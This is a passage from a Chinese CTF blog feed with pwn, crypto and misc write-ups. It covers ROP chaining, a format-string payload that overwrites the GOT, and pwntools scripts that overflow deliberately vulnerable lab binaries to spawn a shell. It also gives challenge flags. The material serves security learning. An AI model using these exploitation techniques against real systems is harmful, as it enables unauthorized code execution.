id="0x2-奇怪的TTL字段"><a href="#0x2-奇怪的TTL字段" class="headerlink" title="0x2 奇怪的TTL字段"></a>0x2 奇怪的TTL字段</h3><p>看ttl.txt，发现只有四种ttl：63 127 191 255，猜测是相当于00 01 10 11</p></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-2019年4月西湖杯-Crypto</title>
      <link href="/2019/04/08/CTF-2019%E5%B9%B44%E6%9C%88%E8%A5%BF%E6%B9%96%E6%9D%AF-Crypto/"/>
      <url>/2019/04/08/CTF-2019%E5%B9%B44%E6%9C%88%E8%A5%BF%E6%B9%96%E6%9D%AF-Crypto/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="0x1-哈夫曼之迷"><a href="#0x1-哈夫曼之迷" class="headerlink" title="0x1 哈夫曼之迷"></a>0x1 哈夫曼之迷</h3><p><a href="/2019/04/08/CTF-2019%E5%B9%B44%E6%9C%88%E8%A5%BF%E6%B9%96%E6%9D%AF-Crypto/2.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/08/CTF-2019%E5%B9%B44%E6%9C%88%E8%A5%BF%E6%B9%96%E6%9D%AF-Crypto/2.jpg" class="lazyload"></a></p></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Pwn-ROP详解</title>
      <link href="/2019/03/28/CTF-Pwn-ROP%E8%AF%A6%E8%A7%A3/"/>
      <url>/2019/03/28/CTF-Pwn-ROP%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="0x01-32位程序栈溢出"><a href="#0x01-32位程序栈溢出" class="headerlink" title="0x01 32位程序栈溢出"></a>0x01 32位程序栈溢出</h1><h2 id="Ret2libc-溢出"><a href="#Ret2libc-溢出" class="headerlink" title="Ret2libc 溢出"></a>Ret2libc 溢出</h2><p>5B     pop     ebx<br>5E     pop     esi<br>5F     pop     edi<br>5D    pop     ebp<br>IDA中，按 alt + B 选择hex 搜索 5B 5E 5F 5D  即可定位Pop3_ret的位置</p><p>一次溢出地址，算出偏移，跳转到至libc<br>junk + ebp + ret_address + Pop3_ret + 参数1 + 参数2 + ….. + 参数n + ret_vul<br>junk + ebp + ret_address + Pop3_ret + 参数1 + 参数2 + ….. + 参数n  + getShell_address</p><h2 id="复杂的多次跳转溢出"><a href="#复杂的多次跳转溢出" class="headerlink" title="复杂的多次跳转溢出"></a>复杂的多次跳转溢出</h2><p>junk + ebp +ret_address1 + Pop3_ret + 参数1 + ret_address2 + Pop3_ret + 参数1 + 参数2 +ret_address3 _ Pop3_ret + 参数 ……</p><h1 id="0x02-64位程序栈溢出"><a href="#0x02-64位程序栈溢出" class="headerlink" title="0x02 64位程序栈溢出"></a>0x02 64位程序栈溢出</h1><h3 id="在x64程序中，最麻烦的莫过于传参，这里我将对传参的技巧进行详细的讲解"><a href="#在x64程序中，最麻烦的莫过于传参，这里我将对传参的技巧进行详细的讲解" class="headerlink" title="在x64程序中，最麻烦的莫过于传参，这里我将对传参的技巧进行详细的讲解"></a>在x64程序中，最麻烦的莫过于传参，这里我将对传参的技巧进行详细的讲解</h3><h3 id="传参顺序-RDI-RSI-RDX-RCX-R8-R9"><a href="#传参顺序-RDI-RSI-RDX-RCX-R8-R9" class="headerlink" title="传参顺序 RDI, RSI, RDX, RCX, R8, R9"></a>传参顺序 RDI, RSI, RDX, RCX, R8, R9</h3><p>只需要在通过ROPgadget工具就可以获得程序中的大部分RET和POP代码</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary 程序名 --only "ret|pop"</span><br></pre></td></tr></tbody></table></figure></div><p>但是我平时遇到的题目大部分并没有 pop rdx  pop rcx等<br>其实只要通过奇数位执行代码就会出现上述指令</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pop rdx=5A</span><br><span class="line">pop rdi=5F</span><br><span class="line">pop rbx=5B</span><br><span class="line">pop rcx=59</span><br><span class="line">pop rsp=5C</span><br><span class="line">pop rsi=5E</span><br><span class="line">pop rbp=5D</span><br><span class="line">pop r8=41 58</span><br><span class="line">pop r9=41 59 </span><br><span class="line"></span><br><span class="line">pop r10=41 5A</span><br><span class="line">pop r11=41 5B </span><br><span class="line">pop r12=41 5C </span><br><span class="line">pop r13=41 5D </span><br><span class="line">pop r14=41 5E </span><br><span class="line">pop r15=41 5F</span><br></pre></td></tr></tbody></table></figure></div><p>由上述代码可以知道，通过奇数位可以得到以下代码</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop r10 -> pop rdx</span><br><span class="line">pop r15 -> pop rdi</span><br><span class="line">pop r11 -> pop rbx</span><br><span class="line">pop rcx -> pop r9</span><br><span class="line">pop rsp -> pop r12</span><br></pre></td></tr></tbody></table></figure></div><p>这样就几乎满足了大部分的参数传递问题<br>只要参数逻辑传递正确，且过程中参数保证不会被改变，基本上都可以拿到shell了，如果出现参数改变，那就要对ret_address进行调整，对其进行偏移，最好直接一步到关键call上。</p><h2 id="0x02-GOT表覆盖"><a href="#0x02-GOT表覆盖" class="headerlink" title="0x02 GOT表覆盖"></a>0x02 GOT表覆盖</h2><p>程序有canary保护，现在存在一个流程 read printf read printf，两次read的长度都比较短，那么可以考虑覆盖got表<br>第一次read 读入 __stack_chk_fail 的 got地址，然后第二次read时，找到第一次输入数据的偏移，然后向这个偏移写入可以重复rop的偏移</p><h2 id="根据实验！！（百度杯-what-the-fuck）"><a href="#根据实验！！（百度杯-what-the-fuck）" class="headerlink" title="根据实验！！（百度杯 what_the_fuck）"></a>根据实验！！（百度杯 what_the_fuck）</h2><p>第一次读入 <strong>stack_chk_fail 的 got地址<br>第二次读入 “%.2435d%12$hn %9%$s%10$ld”<br>    解释：先输出2435(即0x983)个字符，后面的%12$hn向第12偏移（即第一次输入的</strong>stack_chk_fail 的 got地址）所指向的地址写入0x983<br>    注意注意！！！由于延迟绑定，<strong>stack_chk_fail_got的值在第一次调用时的值为</strong>stack_chk_fail__plt + 1，由于 <strong>stack_chk_fail</strong>plt 和 用户代码（例如main、sub_405531等）十分近，所以通过%xd就可以控制一开始输出文本的长度，并将其长度的数值写入<strong>stack_chk_fail_got，实现覆盖got，所以每次执行</strong>stack_chk_fail_got都会跳转到覆盖后的地址(第一次__stack_chk_fail_got+一开始输出文本的长度)</p><p>为了更清楚表示，以下将列出具体变化</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">触发__stack_chk_fail后，</span><br><span class="line">执行 call __stack_chk_fail_plt</span><br><span class="line">跳转到 0x00000000004006C0 jmp cs:off_601020</span><br><span class="line">由于没有绑定 ds:ptr[601020] = 0x00000000004006C6</span><br><span class="line">跳转到 0x00000000004006C6 push 1</span><br><span class="line">所以这里存在漏洞，覆盖</span><br></pre></td></tr></tbody></table></figure></div><p>__stack_chk_fail_got(ds:ptr[0x0000000000601020] = 00000000004006C6) 由于延迟绑定所以它的值等于 __stack_chk_fail_plt + 6 (00000000004006C0 + 6) 至于为什么加6，这是因为下一个汇编指令的地址是 00000000004006C6</p><p>猜测：学长说通过修改read_got可以在下一次执行read的时候跳转到int 0x80，因为在libc中read_plt下方很近的位置就有int 0x80,假设我们可以配好eax等参数，便可以直接跳转到int 0x80，进入中断函数，直接拿到shell</p></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-JarvisOJ-Misc-Flag</title>
      <link href="/2019/03/27/CTF-JarvisOJ-Misc-Flag/"/>
      <url>/2019/03/27/CTF-JarvisOJ-Misc-Flag/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="文件下载42011487927629132-png"><a href="#文件下载42011487927629132-png" class="headerlink" title="文件下载42011487927629132.png"></a>文件下载<a href="42011487927629132.png">42011487927629132.png</a></h2><p>我们先把图片拖入Stegsolve中，然后在上面点击Analyse，点击Data Extract<br><a href="/2019/03/27/CTF-JarvisOJ-Misc-Flag/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/03/27/CTF-JarvisOJ-Misc-Flag/1.png" class="lazyload"></a><br>点击preview，然后在上面的hex的头部发现 50 4B 03 04 ，这是ZIP压缩包的标志<br><a href="/2019/03/27/CTF-JarvisOJ-Misc-Flag/2.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/03/27/CTF-JarvisOJ-Misc-Flag/2.png" class="lazyload"></a><br>我们点击Save Bin保存为ZIP文件<br>若出现压缩包数据错误，只需在winrar的上方菜单中找到修复压缩包即可。<br>然后解压后发现里面是一个linux程序，我们将它拖入IDA中<br>发现Flag<br><a href="/2019/03/27/CTF-JarvisOJ-Misc-Flag/3.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/03/27/CTF-JarvisOJ-Misc-Flag/3.png" class="lazyload"></a></p></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XGCTF-2019年首届Pwn</title>
      <link href="/2019/03/25/XGCTF-2019%E5%B9%B4%E9%A6%96%E5%B1%8APwn/"/>
      <url>/2019/03/25/XGCTF-2019%E5%B9%B4%E9%A6%96%E5%B1%8APwn/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h4 id="前提：linux系统（我是用ubuntu），并装有pwntools，python"><a href="#前提：linux系统（我是用ubuntu），并装有pwntools，python" class="headerlink" title="前提：linux系统（我是用ubuntu），并装有pwntools，python"></a>前提：linux系统（我是用ubuntu），并装有pwntools，python</h4><h3 id="0x1-easy-pwn"><a href="#0x1-easy-pwn" class="headerlink" title="0x1 easy pwn"></a>0x1 easy pwn</h3><h3 id="为了方便大家理解，附上程序的源代码"><a href="#为了方便大家理解，附上程序的源代码" class="headerlink" title="为了方便大家理解，附上程序的源代码"></a>为了方便大家理解，附上程序的源代码</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include<stdio.h></stdio.h></span><br><span class="line">#include<unistd.h></unistd.h></span><br><span class="line">#include<stdlib.h></stdlib.h></span><br><span class="line"></span><br><span class="line">int main(){</span><br><span class="line">char leak[8];</span><br><span class="line">int n = 2018;</span><br><span class="line">read(0,leak,0x8+0x4);</span><br><span class="line">printf("%d\n",n);</span><br><span class="line">if(n == 2019){</span><br><span class="line">system("sh");</span><br><span class="line">}else{</span><br><span class="line">printf("瞅啥瞅啊，想干啥啊？\n");</span><br><span class="line">}</span><br><span class="line">return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h5 id="我们将程序导入IDA中，注意该程序是64位程序，所以需要导入到x64的IDA中"><a href="#我们将程序导入IDA中，注意该程序是64位程序，所以需要导入到x64的IDA中" class="headerlink" title="我们将程序导入IDA中，注意该程序是64位程序，所以需要导入到x64的IDA中"></a>我们将程序导入IDA中，注意该程序是64位程序，所以需要导入到x64的IDA中</h5><p><a href="https://i.loli.net/2019/03/26/5c990791d2348.png" target="_blank" rel="noopener"><img alt="4.png" data-src="https://i.loli.net/2019/03/26/5c990791d2348.png" class="lazyload"></a></p><h5 id="然后F5反编译为伪代码"><a href="#然后F5反编译为伪代码" class="headerlink" title="然后F5反编译为伪代码"></a>然后F5反编译为伪代码</h5><p><a href="https://i.loli.net/2019/03/26/5c99066519ce2.png" target="_blank" rel="noopener"><img alt="1.png" data-src="https://i.loli.net/2019/03/26/5c99066519ce2.png" class="lazyload"></a></p><h5 id="很明显这是一个read溢出漏洞，我们只需要在输入buf时，多输入一些数据，使得输入的数据将v5覆盖，我们先双击buf看看栈的情况"><a href="#很明显这是一个read溢出漏洞，我们只需要在输入buf时，多输入一些数据，使得输入的数据将v5覆盖，我们先双击buf看看栈的情况" class="headerlink" title="很明显这是一个read溢出漏洞，我们只需要在输入buf时，多输入一些数据，使得输入的数据将v5覆盖，我们先双击buf看看栈的情况"></a>很明显这是一个read溢出漏洞，我们只需要在输入buf时，多输入一些数据，使得输入的数据将v5覆盖，我们先双击buf看看栈的情况</h5><p><a href="https://i.loli.net/2019/03/26/5c99066538272.png" target="_blank" rel="noopener"><img alt="2.png" data-src="https://i.loli.net/2019/03/26/5c99066538272.png" class="lazyload"></a></p><h5 id="但是我们不知道v5在栈中位置，返回到伪代码，然后双击v5"><a href="#但是我们不知道v5在栈中位置，返回到伪代码，然后双击v5" class="headerlink" title="但是我们不知道v5在栈中位置，返回到伪代码，然后双击v5"></a>但是我们不知道v5在栈中位置，返回到伪代码，然后双击v5</h5><p><a href="https://i.loli.net/2019/03/26/5c9906657472b.png" target="_blank" rel="noopener"><img alt="5.png" data-src="https://i.loli.net/2019/03/26/5c9906657472b.png" class="lazyload"></a></p><h5 id="发现指向var-4，所以v5-var-4"><a href="#发现指向var-4，所以v5-var-4" class="headerlink" title="发现指向var_4，所以v5=var_4"></a>发现指向var_4，所以v5=var_4</h5><p><a href="https://i.loli.net/2019/03/26/5c990665762d8.png" target="_blank" rel="noopener"><img alt="6.png" data-src="https://i.loli.net/2019/03/26/5c990665762d8.png" class="lazyload"></a></p><h5 id="buf开始读入数据一直到var-4，中间需要读入0xC-0x4-0x8-所以我们要先输入8个垃圾数据，然后紧跟着2019即可，例如-aaaaaaaa-2019-这样就可以将var-4的数据覆盖成2019"><a href="#buf开始读入数据一直到var-4，中间需要读入0xC-0x4-0x8-所以我们要先输入8个垃圾数据，然后紧跟着2019即可，例如-aaaaaaaa-2019-这样就可以将var-4的数据覆盖成2019" class="headerlink" title="buf开始读入数据一直到var_4，中间需要读入0xC-0x4=0x8,所以我们要先输入8个垃圾数据，然后紧跟着2019即可，例如: aaaaaaaa  +  (2019)  这样就可以将var_4的数据覆盖成2019"></a>buf开始读入数据一直到var_4，中间需要读入0xC-0x4=0x8,所以我们要先输入8个垃圾数据，然后紧跟着2019即可，例如: aaaaaaaa  +  (2019)  这样就可以将var_4的数据覆盖成2019</h5><h5 id="附上我的payload"><a href="#附上我的payload" class="headerlink" title="附上我的payload"></a>附上我的payload</h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = remote("10.129.2.227",10003)</span><br><span class="line">payload = 'a' * 8 + p64(2019)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line">print sh.recv()</span><br></pre></td></tr></tbody></table></figure></div><h5 id="执行代码"><a href="#执行代码" class="headerlink" title="执行代码"></a>执行代码</h5><p><a href="https://i.loli.net/2019/03/26/5c99066572cee.png" target="_blank" rel="noopener"><img alt="7.png" data-src="https://i.loli.net/2019/03/26/5c99066572cee.png" class="lazyload"></a></p><h3 id="得到flag-xgctf-Chan9e-th4-sTaCk"><a href="#得到flag-xgctf-Chan9e-th4-sTaCk" class="headerlink" title="得到flag:  xgctf{Chan9e_th4_sTaCk!}"></a>得到flag:  xgctf{Chan9e_th4_sTaCk!}</h3><h3 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h3><h5 id="为了方便大家理解，附上程序的源代码-1"><a href="#为了方便大家理解，附上程序的源代码-1" class="headerlink" title="为了方便大家理解，附上程序的源代码"></a>为了方便大家理解，附上程序的源代码</h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include<stdio.h></stdio.h></span><br><span class="line">#include<stdlib.h></stdlib.h></span><br><span class="line">#include<unistd.h></unistd.h></span><br><span class="line">void getShell(){</span><br><span class="line">system("/bin/sh");</span><br><span class="line">}</span><br><span class="line">int vul_function(){</span><br><span class="line">char junk[8];</span><br><span class="line">printf("你想对我说什么吗？\n");</span><br><span class="line">return read(0,junk,0x50);</span><br><span class="line">}</span><br><span class="line">int main(){</span><br><span class="line">vul_function();</span><br><span class="line">return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h5 id="简单说明一下思路：首先main里面直接调用vul-function，然后再vul-function中直接返回read且读入数据的长度大于junk字符串长度，存在溢出"><a href="#简单说明一下思路：首先main里面直接调用vul-function，然后再vul-function中直接返回read且读入数据的长度大于junk字符串长度，存在溢出" class="headerlink" title="简单说明一下思路：首先main里面直接调用vul_function，然后再vul_function中直接返回read且读入数据的长度大于junk字符串长度，存在溢出"></a>简单说明一下思路：首先main里面直接调用vul_function，然后再vul_function中直接返回read且读入数据的长度大于junk字符串长度，存在溢出</h5><h5 id="栈的结构-junk-ebp-ret-address-pading-参数1-参数2-……-参数n"><a href="#栈的结构-junk-ebp-ret-address-pading-参数1-参数2-……-参数n" class="headerlink" title="栈的结构    junk+ebp+ret_address+pading +参数1+参数2 +……  +参数n"></a>栈的结构    junk+ebp+ret_address+pading +参数1+参数2 +……  +参数n</h5><h5 id="所以我们输入的字符首先先填满junk，然后再覆盖ebp，然后覆盖ret-address为getShell的地址，然后vul-function执行完返回时-直接返回到getShell-拿到shell"><a href="#所以我们输入的字符首先先填满junk，然后再覆盖ebp，然后覆盖ret-address为getShell的地址，然后vul-function执行完返回时-直接返回到getShell-拿到shell" class="headerlink" title="所以我们输入的字符首先先填满junk，然后再覆盖ebp，然后覆盖ret_address为getShell的地址，然后vul_function执行完返回时 直接返回到getShell,拿到shell"></a>所以我们输入的字符首先先填满junk，然后再覆盖ebp，然后覆盖ret_address为getShell的地址，然后vul_function执行完返回时 直接返回到getShell,拿到shell</h5><h5 id="接下来我们开始分析文件，将文件导入IDA中，F5反编译"><a href="#接下来我们开始分析文件，将文件导入IDA中，F5反编译" class="headerlink" title="接下来我们开始分析文件，将文件导入IDA中，F5反编译"></a>接下来我们开始分析文件，将文件导入IDA中，F5反编译</h5><p><a href="https://i.loli.net/2019/03/26/5c99066585429.png" target="_blank" rel="noopener"><img alt="9.png" data-src="https://i.loli.net/2019/03/26/5c99066585429.png" class="lazyload"></a></p><h5 id="然后进入vul-function"><a href="#然后进入vul-function" class="headerlink" title="然后进入vul_function"></a>然后进入vul_function</h5><p><a href="https://i.loli.net/2019/03/26/5c99066571136.png" target="_blank" rel="noopener"><img alt="10.png" data-src="https://i.loli.net/2019/03/26/5c99066571136.png" class="lazyload"></a></p><h5 id="双击头部的-char-buf-esp-8h-ebp-10h-的buf"><a href="#双击头部的-char-buf-esp-8h-ebp-10h-的buf" class="headerlink" title="双击头部的 char buf; // [esp+8h] [ebp-10h]  的buf"></a>双击头部的 char buf; // [esp+8h] [ebp-10h]  的buf</h5><p><a href="https://i.loli.net/2019/03/26/5c9906e46a621.png" target="_blank" rel="noopener"><img alt="11.png" data-src="https://i.loli.net/2019/03/26/5c9906e46a621.png" class="lazyload"></a></p><h5 id="根据-ebp-10h-我们知道junk首先需要覆盖-0x10-的长度"><a href="#根据-ebp-10h-我们知道junk首先需要覆盖-0x10-的长度" class="headerlink" title="根据[ebp-10h] 我们知道junk首先需要覆盖 0x10 的长度"></a>根据[ebp-10h] 我们知道junk首先需要覆盖 0x10 的长度</h5><h5 id="接下来要覆盖ebp，32位程序中ebp为四个字节，所以可以随意用4个字节的数据填充掉，然后就是ret-address-返回地址"><a href="#接下来要覆盖ebp，32位程序中ebp为四个字节，所以可以随意用4个字节的数据填充掉，然后就是ret-address-返回地址" class="headerlink" title="接下来要覆盖ebp，32位程序中ebp为四个字节，所以可以随意用4个字节的数据填充掉，然后就是ret_address(返回地址)"></a>接下来要覆盖ebp，32位程序中ebp为四个字节，所以可以随意用4个字节的数据填充掉，然后就是ret_address(返回地址)</h5><h5 id="我们需要找到能让我们拿到shell的函数，我们双击进入"><a href="#我们需要找到能让我们拿到shell的函数，我们双击进入" class="headerlink" title="我们需要找到能让我们拿到shell的函数，我们双击进入"></a>我们需要找到能让我们拿到shell的函数，我们双击进入</h5><p><a href="https://i.loli.net/2019/03/26/5c9906e48a2ee.png" target="_blank" rel="noopener"><img alt="12.png" data-src="https://i.loli.net/2019/03/26/5c9906e48a2ee.png" class="lazyload"></a></p><p><a href="https://i.loli.net/2019/03/26/5c9906e48be4a.png" target="_blank" rel="noopener"><img alt="13.png" data-src="https://i.loli.net/2019/03/26/5c9906e48be4a.png" class="lazyload"></a></p><h5 id="显然只要我们执行了-system-“-bin-sh”-就可以拿到flag"><a href="#显然只要我们执行了-system-“-bin-sh”-就可以拿到flag" class="headerlink" title="显然只要我们执行了 system(“/bin/sh”) 就可以拿到flag"></a>显然只要我们执行了 system(“/bin/sh”) 就可以拿到flag</h5><h5 id="接下来我们开始构造payload，我使用的是python"><a href="#接下来我们开始构造payload，我使用的是python" class="headerlink" title="接下来我们开始构造payload，我使用的是python"></a>接下来我们开始构造payload，我使用的是python</h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = remote("10.129.2.227",10000);</span><br><span class="line">e = ELF("test");</span><br><span class="line">junk = 0x10 * 'a'</span><br><span class="line">ebp = 0x4 * "a"</span><br><span class="line">getShell_address = e.symbols['getShell'] </span><br><span class="line">payload = junk + ebp + p32(getShell_address)</span><br><span class="line">sh.sendline(payload);</span><br><span class="line">sh.interactive();</span><br></pre></td></tr></tbody></table></figure></div><h5 id="执行结果如下"><a href="#执行结果如下" class="headerlink" title="执行结果如下"></a>执行结果如下</h5><p><a href="https://i.loli.net/2019/03/26/5c9906e4d274e.png" target="_blank" rel="noopener"><img alt="14.png" data-src="https://i.loli.net/2019/03/26/5c9906e4d274e.png" class="lazyload"></a></p><h3 id="得到flag-xgctf-r4tn-t0-get5hell"><a href="#得到flag-xgctf-r4tn-t0-get5hell" class="headerlink" title="得到flag:   xgctf{r4tn_t0_get5hell}"></a>得到flag:   xgctf{r4tn_t0_get5hell}</h3><h3 id="0x3-反向读取"><a href="#0x3-反向读取" class="headerlink" title="0x3 反向读取"></a>0x3 反向读取</h3><h5 id="这道题考察了对于数组下标为负的溢出"><a href="#这道题考察了对于数组下标为负的溢出" class="headerlink" title="这道题考察了对于数组下标为负的溢出"></a>这道题考察了对于数组下标为负的溢出</h5><h5 id="题目告诉我们，只要在本地输出-FAKE-然后调整为远程连接-即可得到flag"><a href="#题目告诉我们，只要在本地输出-FAKE-然后调整为远程连接-即可得到flag" class="headerlink" title="题目告诉我们，只要在本地输出 FAKE{****} 然后调整为远程连接 即可得到flag"></a>题目告诉我们，只要在本地输出 FAKE{<strong><strong>****</strong></strong>} 然后调整为远程连接 即可得到flag</h5><h5 id="首先我们先把程序拖入IDA中，注意了该程序为x64程序，所以需要x64的IDA"><a href="#首先我们先把程序拖入IDA中，注意了该程序为x64程序，所以需要x64的IDA" class="headerlink" title="首先我们先把程序拖入IDA中，注意了该程序为x64程序，所以需要x64的IDA"></a>首先我们先把程序拖入IDA中，注意了该程序为x64程序，所以需要x64的IDA</h5><p><a href="https://i.loli.net/2019/03/26/5c9906e4d46ee.png" target="_blank" rel="noopener"><img alt="15.png" data-src="https://i.loli.net/2019/03/26/5c9906e4d46ee.png" class="lazyload"></a></p><h5 id="然后F5进行反编译"><a href="#然后F5进行反编译" class="headerlink" title="然后F5进行反编译"></a>然后F5进行反编译</h5><p><a href="https://i.loli.net/2019/03/26/5c9906e4ca1f8.png" target="_blank" rel="noopener"><img alt="16.png" data-src="https://i.loli.net/2019/03/26/5c9906e4ca1f8.png" class="lazyload"></a></p><h5 id="双击vul-function"><a href="#双击vul-function" class="headerlink" title="双击vul_function"></a>双击vul_function</h5><p><a href="https://i.loli.net/2019/03/26/5c9906e4d6260.png" target="_blank" rel="noopener"><img alt="17.png" data-src="https://i.loli.net/2019/03/26/5c9906e4d6260.png" class="lazyload"></a></p><h5 id="我们在以下这条语句中发现了漏洞"><a href="#我们在以下这条语句中发现了漏洞" class="headerlink" title="我们在以下这条语句中发现了漏洞"></a>我们在以下这条语句中发现了漏洞</h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ( *((_BYTE *)&v2 + i) != *((_BYTE *)&v8 + s[i]) )</span><br></pre></td></tr></tbody></table></figure></div><h5 id="amp-v8是地址，若s-i-为负数的话，就可以读到低位的数据，那么这个表达式就等效于"><a href="#amp-v8是地址，若s-i-为负数的话，就可以读到低位的数据，那么这个表达式就等效于" class="headerlink" title="&v8是地址，若s[i]为负数的话，就可以读到低位的数据，那么这个表达式就等效于"></a>&v8是地址，若s[i]为负数的话，就可以读到低位的数据，那么这个表达式就等效于</h5><h5 id="if-BYTE-amp-v2-i-BYTE-amp-v2-i-显然这个if结果是false，就可以执行printf-“-s”-amp-v2-得到flag了"><a href="#if-BYTE-amp-v2-i-BYTE-amp-v2-i-显然这个if结果是false，就可以执行printf-“-s”-amp-v2-得到flag了" class="headerlink" title="if ( *((_BYTE *)&v2 + i) != *((_BYTE *)&v2 + i) )  显然这个if结果是false，就可以执行printf(“%s”,&v2); 得到flag了"></a>if ( *((_BYTE *)&v2 + i) != *((_BYTE *)&v2 + i) )  显然这个if结果是false，就可以执行printf(“%s”,&v2); 得到flag了</h5><h5 id="对此我们需要验证我们输入的数据，是否在转化为char的时候存在负数，注意了数组s是char，不是int"><a href="#对此我们需要验证我们输入的数据，是否在转化为char的时候存在负数，注意了数组s是char，不是int" class="headerlink" title="对此我们需要验证我们输入的数据，是否在转化为char的时候存在负数，注意了数组s是char，不是int"></a>对此我们需要验证我们输入的数据，是否在转化为char的时候存在负数，注意了数组s是char，不是int</h5><h5 id="我编写了以下的C-代码来验证"><a href="#我编写了以下的C-代码来验证" class="headerlink" title="我编写了以下的C++代码来验证"></a>我编写了以下的C++代码来验证</h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" 